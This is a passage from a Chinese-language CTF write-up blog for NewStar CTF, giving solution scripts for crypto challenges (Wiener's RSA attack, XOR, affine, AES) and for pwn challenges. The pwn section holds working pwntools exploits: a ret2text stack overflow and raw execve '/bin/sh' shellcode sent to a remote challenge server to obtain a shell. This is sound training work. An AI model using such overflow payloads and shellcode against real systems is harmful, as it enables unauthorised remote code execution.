   <span class="hljs-keyword">return</span> (num,denom)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">egcd</span>(<span class="hljs-params">a,b</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Extended Euclidean Algorithm</span><br><span class="hljs-string">    returns x, y, gcd(a,b) such that ax + by = gcd(a,b)</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    u, u1 = <span class="hljs-number">1</span>, <span class="hljs-number">0</span><br>    v, v1 = <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> b:<br>        q = a // b<br>        u, u1 = u1, u - q * u1<br>        v, v1 = v1, v - q * v1<br>        a, b = b, a - q * b<br>    <span class="hljs-keyword">return</span> u, v, a<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gcd</span>(<span class="hljs-params">a,b</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    2.8 times faster than egcd(a,b)[2]</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    a,b=(b,a) <span class="hljs-keyword">if</span> a&lt;b <span class="hljs-keyword">else</span> (a,b)<br>    <span class="hljs-keyword">while</span> b:<br>        a,b=b,a%b<br>    <span class="hljs-keyword">return</span> a<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">modInverse</span>(<span class="hljs-params">e,n</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    d such that de = 1 (mod n)</span><br><span class="hljs-string">    e must be coprime to n</span><br><span class="hljs-string">    this is assumed to be true</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">return</span> egcd(e,n)[<span class="hljs-number">0</span>]%n<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">totient</span>(<span class="hljs-params">p,q</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Calculates the totient of pq</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">return</span> (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bitlength</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Calculates the bitlength of x</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">assert</span> x &gt;= <span class="hljs-number">0</span><br>    n = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> x &gt; <span class="hljs-number">0</span>:<br>        n = n+<span class="hljs-number">1</span><br>        x = x&gt;&gt;<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> n<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">isqrt</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Calculates the integer square root</span><br><span class="hljs-string">    for arbitrary large nonnegative integers</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> n &lt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&#x27;square root not defined for negative numbers&#x27;</span>)<br>    <br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    a, b = <span class="hljs-built_in">divmod</span>(bitlength(n), <span class="hljs-number">2</span>)<br>    x = <span class="hljs-number">2</span>**(a+b)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        y = (x + n//x)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> y &gt;= x:<br>            <span class="hljs-keyword">return</span> x<br>        x = y<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_perfect_square</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    If n is a perfect square it returns sqrt(n),</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    otherwise returns -1</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    h = n &amp; <span class="hljs-number">0xF</span>; <span class="hljs-comment">#last hexadecimal &quot;digit&quot;</span><br>    <br>    <span class="hljs-keyword">if</span> h &gt; <span class="hljs-number">9</span>:<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span> <span class="hljs-comment"># return immediately in 6 cases out of 16.</span><br><br>    <span class="hljs-comment"># Take advantage of Boolean short-circuit evaluation</span><br>    <span class="hljs-keyword">if</span> ( h != <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> h != <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> h != <span class="hljs-number">5</span> <span class="hljs-keyword">and</span> h != <span class="hljs-number">6</span> <span class="hljs-keyword">and</span> h != <span class="hljs-number">7</span> <span class="hljs-keyword">and</span> h != <span class="hljs-number">8</span> ):<br>        <span class="hljs-comment"># take square root if you must</span><br>        t = isqrt(n)<br>        <span class="hljs-keyword">if</span> t*t == n:<br>            <span class="hljs-keyword">return</span> t<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br>    <br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wiener_hack</span>(<span class="hljs-params">e, n</span>):<br>    frac = rational_to_contfrac(e, n)<br>    convergents = convergents_from_contfrac(frac)<br>    <span class="hljs-keyword">for</span> (k, d) <span class="hljs-keyword">in</span> convergents:<br>        <span class="hljs-keyword">if</span> k != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> (e * d - <span class="hljs-number">1</span>) % k == <span class="hljs-number">0</span>:<br>            phi = (e * d - <span class="hljs-number">1</span>) // k<br>            s = n - phi + <span class="hljs-number">1</span><br>            discr = s * s - <span class="hljs-number">4</span> * n<br>            <span class="hljs-keyword">if</span> (discr &gt;= <span class="hljs-number">0</span>):<br>                t = is_perfect_square(discr)<br>                <span class="hljs-keyword">if</span> t != -<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (s + t) % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hacked!&quot;</span>)<br>                    <span class="hljs-keyword">return</span> d<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    n = <span class="hljs-number">19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span><br>    e = <span class="hljs-number">8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span><br>    c = <span class="hljs-number">6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span><br>    d = wiener_hack(e, n)<br>    m = <span class="hljs-built_in">pow</span>(c,d,n)<br>    <span class="hljs-built_in">print</span> (long_to_bytes(m))<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>拿到flag：<code>flag&#123;learn_some_continued_fraction_technique#dc16885c&#125;</code></p><h3 id="babyxor"><a href="#babyxor" class="headerlink" title="babyxor"></a>babyxor</h3><p>打开附件，得到一段python：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> *<br><br>ciphertext = []<br><br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> flag:<br>    ciphertext.append(f ^ key)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(ciphertext).<span class="hljs-built_in">hex</span>())<br><span class="hljs-comment"># e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2</span><br></code></pre></td></tr></table></figure><p>由于已知flag是<code>flag&#123;</code>开头的，所以我们可以得到key的值，编写解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">ciphertext_hex = <span class="hljs-string">&#x27;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&#x27;</span><br><br><span class="hljs-comment"># 将16进制字符串转换为字节列表</span><br>ciphertext_bytes = <span class="hljs-built_in">bytes</span>.fromhex(ciphertext_hex)<br><br><span class="hljs-comment"># 解密密文</span><br>plaintext = []<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> ciphertext_bytes:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">chr</span>(c))^<span class="hljs-number">143</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-comment">#plaintext.append(c ^ key)</span><br><br><span class="hljs-comment"># 将字节列表转换为字符串</span><br>plaintext_str = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(p) <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> plaintext])<br><br><span class="hljs-built_in">print</span>(plaintext_str)<br></code></pre></td></tr></table></figure><p>得到flag：<code>flag&#123;x0r_15_symm3try_and_e4zy!!!!!!&#125;</code></p><h3 id="babyencoding"><a href="#babyencoding" class="headerlink" title="babyencoding"></a>babyencoding</h3><p>使用cyberchef，第一段得到<code>flag&#123;dazzling_encoding#4e0ad4</code>，第二段得到：<code>f0ca08d1e1d0f10c0c7afe422fea7</code>，第三段使用UUencode解密<a href="https://ctf.bugku.com/tool/uuencode">UUencode加密&#x2F;解密 - Bugku CTF</a>，得到<code>c55192c992036ef623372601ff3a&#125;</code>。</p><p>拼接一下，得到flag：<code>flag&#123;dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a&#125;</code></p><h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><p>附件一段python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag, key<br><br>ciphertext = []<br><br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> flag:<br>    ciphertext.append((key[<span class="hljs-number">0</span>]*f + key[<span class="hljs-number">1</span>]) % <span class="hljs-number">256</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(ciphertext).<span class="hljs-built_in">hex</span>())<br><br><span class="hljs-comment"># dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064</span><br></code></pre></td></tr></table></figure><p>因为flag前4个字母是flag，因此可以列出4个方程</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">221</span>+<span class="hljs-number">256</span>*a=key0*<span class="hljs-number">102</span>+key1<br><span class="hljs-attribute">67</span>+<span class="hljs-number">256</span>*b=key0*<span class="hljs-number">108</span>+key1<br><span class="hljs-attribute">136</span>+<span class="hljs-number">256</span>*c=key0*<span class="hljs-number">97</span>+key1<br><span class="hljs-attribute">238</span>+<span class="hljs-number">256</span>*d=key0*<span class="hljs-number">103</span>+key1<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">key0</span> = (<span class="hljs-number">52</span> + <span class="hljs-number">256</span> * (a - b + c - d)) / -<span class="hljs-number">12</span><br><span class="hljs-attribute">key1</span> = <span class="hljs-number">221</span> + <span class="hljs-number">256</span> * a - key0 * <span class="hljs-number">102</span><br></code></pre></td></tr></table></figure><p>测试猜测key0&#x3D;17，key1&#x3D;23</p><p>解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 密文和密钥</span><br>ciphertext_hex = <span class="hljs-string">&quot;dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064&quot;</span><br>key = (<span class="hljs-number">17</span>, <span class="hljs-number">23</span>)  <span class="hljs-comment"># 请将a和b替换为实际的密钥值</span><br><br><span class="hljs-comment"># 计算key[0]的模数逆</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mod_inverse</span>(<span class="hljs-params">a, m</span>):<br>    m0, x0, x1 = m, <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> a &gt; <span class="hljs-number">1</span>:<br>        q = a // m<br>        m, a = a % m, m<br>        x0, x1 = x1 - q * x0, x0<br>    <span class="hljs-keyword">return</span> x1 + m0 <span class="hljs-keyword">if</span> x1 &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> x1<br><br><span class="hljs-comment"># 将密文转换为字节列表</span><br>ciphertext_bytes = <span class="hljs-built_in">bytes</span>.fromhex(ciphertext_hex)<br>flag = []<br><br><span class="hljs-comment"># 逆向解密</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> ciphertext_bytes:<br>    original_byte = ((c - key[<span class="hljs-number">1</span>]) * mod_inverse(key[<span class="hljs-number">0</span>], <span class="hljs-number">256</span>)) % <span class="hljs-number">256</span><br>    flag.append(original_byte)<br><br><span class="hljs-comment"># 将解密后的字节列表转换为字符串</span><br>original_flag = <span class="hljs-built_in">bytes</span>(flag).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(original_flag)<br></code></pre></td></tr></table></figure><p>得到flag：<code>flag&#123;4ff1ne_c1pher_i5_very_3azy&#125;</code></p><h3 id="babyaes"><a href="#babyaes" class="headerlink" title="babyaes"></a>babyaes</h3><p>打开附件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">return</span> data + <span class="hljs-string">b&quot;&quot;</span>.join([<span class="hljs-string">b&#x27;\x00&#x27;</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(data))])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    flag_ = pad(flag)<br>    key = os.urandom(<span class="hljs-number">16</span>) * <span class="hljs-number">2</span><br>    iv = os.urandom(<span class="hljs-number">16</span>)<br>    <span class="hljs-built_in">print</span>(bytes_to_long(key) ^ bytes_to_long(iv) ^ <span class="hljs-number">1</span>)<br>    aes = AES.new(key, AES.MODE_CBC, iv)<br>    enc_flag = aes.encrypt(flag_)<br>    <span class="hljs-built_in">print</span>(enc_flag)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><span class="hljs-comment"># 3657491768215750635844958060963805125333761387746954618540958489914964573229</span><br><span class="hljs-comment"># b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span><br></code></pre></td></tr></table></figure><p>key是<strong>32bytes</strong>,<strong>256bits</strong> ；iv是<strong>16bytes ,128bits</strong></p><p>key^iv ，那么只有 iv 与 key的<strong>低128位</strong>相异或，所以<strong>key的高128位是固定不变的</strong>。所以输出结果的高128bits,就是key的高128bits,进而可以得到key的所有值256bits。</p><p>之后key的低128bits，与输出结果的低128bits相异或，所得结果就是iv的值了</p><p>解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span>*<br><br>xor = <span class="hljs-number">3657491768215750635844958060963805125333761387746954618540958489914964573229</span>^<span class="hljs-number">1</span><br>enc_flag = <span class="hljs-string">b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span><br>out = long_to_bytes(xor)<br>key = out[:<span class="hljs-number">16</span>]*<span class="hljs-number">2</span><br><span class="hljs-comment"># print(key)</span><br>iv = bytes_to_long(key[<span class="hljs-number">16</span>:])^bytes_to_long(out[<span class="hljs-number">16</span>:])<br><span class="hljs-comment"># print(iv)</span><br>iv = long_to_bytes(iv)<br><span class="hljs-comment"># print(iv)</span><br>aes = AES.new(key,AES.MODE_CBC,iv)<br>flag = aes.decrypt(enc_flag)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>得到<code>b&#39;firsT_cry_Aes\x00\x00\x00&#39;</code></p><p>flag：<code>flag&#123;firsT_cry_Aes&#125;</code></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>3&#x2F;5</p><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>栈溢出</p><p>ida打开发现明显的栈溢出，而且还有后门backdoor()函数</p><p>反汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br><br>  init(argc, argv, envp);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to NewStar CTF!!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Show me your magic&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>uLL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>backdoor代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">backdoor</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Congratulations!!!&quot;</span>);<br>  <span class="hljs-keyword">return</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>backdoor地址00000000004011FB</p><p>编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>return_address = <span class="hljs-number">0x4011FB</span><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">40</span><br><br><span class="hljs-comment"># 构造payload</span><br>payload = padding + p64(return_address)<br><br><span class="hljs-comment"># 连接目标服务</span><br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27081</span>)<br>r.recvline()<br>r.recvline()<br><span class="hljs-comment"># 发送payload</span><br>r.sendline(payload)<br><br><span class="hljs-comment"># 接收响应</span><br>r.interactive()<br></code></pre></td></tr></table></figure><p>之后直接cat flag即可拿到flag：<code>flag&#123;11b564d9-fb42-41c6-a215-a750c4fc8c28&#125;</code></p><h3 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h3><p>反汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">void</span> *buf; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  init(argc, argv, envp);<br>  buf = (<span class="hljs-type">void</span> *)(<span class="hljs-type">int</span>)mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x66660000</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">7</span>, <span class="hljs-number">50</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to NewStar CTF!!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Show me your magic&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>uLL);<br>  JUMPOUT(<span class="hljs-number">0x66660000</span>LL);<br>&#125;<br></code></pre></td></tr></table></figure><p>直接写shellcode即可，网上随便搜一个shellcode，编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># shellcode</span><br>shellcode = <span class="hljs-string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&#x27;</span><br><br><span class="hljs-comment"># 启动进程</span><br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28681</span>)<br><br><span class="hljs-comment"># 读取欢迎信息</span><br><span class="hljs-built_in">print</span>(r.recv())<br><br><span class="hljs-comment"># 写入shellcode到内存块</span><br>r.sendline(shellcode)<br><br>r.interactive()<br><br><span class="hljs-comment"># 关闭进程</span><br>r.close()<br></code></pre></td></tr></table></figure><p>直接cat flag</p><h3 id="newstar-shop"><a href="#newstar-shop" class="headerlink" title="newstar shop"></a>newstar shop</h3><p>主函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  init(argc, argv, envp);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    menu();<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)__isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v3) &lt;= <span class="hljs-number">0</span> )<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid input&quot;</span>);<br>    <span class="hljs-keyword">switch</span> ( v3 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        shop();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        makemoney();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        dont_try();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;nothing here&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>        